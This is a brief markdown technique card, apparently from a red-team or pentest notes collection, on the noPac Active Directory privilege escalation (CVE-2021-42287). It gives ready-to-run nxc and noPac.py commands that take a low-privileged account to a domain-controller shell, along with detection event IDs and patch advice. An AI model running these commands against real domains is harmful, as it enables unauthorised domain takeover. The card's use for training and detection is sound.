---
id: nopac
type: technique
label: "noPac (sAMAccountName spoofing)"
phase: "privesc"
tools: ["impacket", "rubeus", "powermad"]
cve: "cve-2021-42287"
detect: "4769 showing sAMAccountName/dNSHostName spoofing."
mitre: "T1558"
tag: "new"
---


# noPac (sAMAccountName spoofing)

### Affected object / attribute
**`sAMAccountName`** on a machine account + **KDC PAC validation**.

### Concept (deep)
See `cve-2021-42287.md`. Machine rename + KDC name re-lookup → **DC-equivalent ticket**.

### Commands
```bash
# ── Check MAQ and exploit ────────────────────────────────────────────
nxc ldap 10.10.10.5 -u lowpriv -p 'Password123!' -M maq
python3 noPac.py corp.local/lowpriv:'Password123!' \
  -dc-ip 10.10.10.5 -dc-host DC01.corp.local -shell
```

### Detection
**4741+4781** within minutes; **4768** for a machine name equal to a DC; patch.

---
